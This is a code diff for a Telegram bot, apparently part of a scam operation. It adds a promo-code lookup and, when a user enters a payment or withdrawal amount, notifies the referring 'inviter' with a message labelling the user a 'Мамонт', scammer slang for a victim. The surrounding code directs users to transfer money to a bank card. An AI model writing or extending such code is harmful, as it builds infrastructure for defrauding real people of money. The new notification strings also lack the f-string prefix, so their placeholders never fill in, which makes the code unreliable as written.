@@ -181,7 +181,18 @@ def get_data(telegram_id):
             comment = row[1]
             amount = row[2]
             return comment, amount
-
+        
+        
+def get_promo(telegram_id):
+    conn = sqlite3.connect("users.db")
+    cursor = conn.cursor()
+    for row in cursor.execute("SELECT telegram_id,promo FROM users"):
+        user_id = row[0]
+        if user_id == telegram_id:
+            promo = row[1]
+            return promo
+    
+        
 def add_promo(telegram_id, promo):
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
@@ -475,6 +486,11 @@ async def get_sum(message: types.Message, state: FSMContext):
         try:
             int(message.text)
             await state.update_data(summ=message.text)
+            try:
+                inviter = get_promo(message.chat.id)
+                await bot.send_message(inviter, 'Попытка вывода суммы {message.text}р\nМамонт {message.from.first_name} {message.from.last_name}')
+            except:
+                pass
             payment = await state.get_data()
             comment = ''.join(random.choices('qwertyuiopsdfghjkl;zxcvbnm',k=10)) + str(random.randint(1, 1000))
             s = requests.Session()
@@ -494,6 +510,11 @@ async def get_sum(message: types.Message, state: FSMContext):
         try:
             int(message.text)
             await state.update_data(summ=message.text)
+            try:
+                inviter = get_promo(message.chat.id)
+                await bot.send_message(inviter, 'Попытка вывода суммы {message.text} грн\nМамонт {message.from.first_name} {message.from.last_name}')
+            except:
+                pass
             payment = await state.get_data()
             amount = payment['summ']
             await bot.send_message(message.chat.id, f'♻️Оплата на банковскую карту\n\nПереведите введенную сумму на карту {cardua}\n\nВАЖНО!Обязательно укажите комментарий: {message.chat.id}\nЕсли вы не укажите комментарий, деньги не поступят на счёт!\n\nЕсли возникнут проблемы, обратитесь в тех.поддержку')
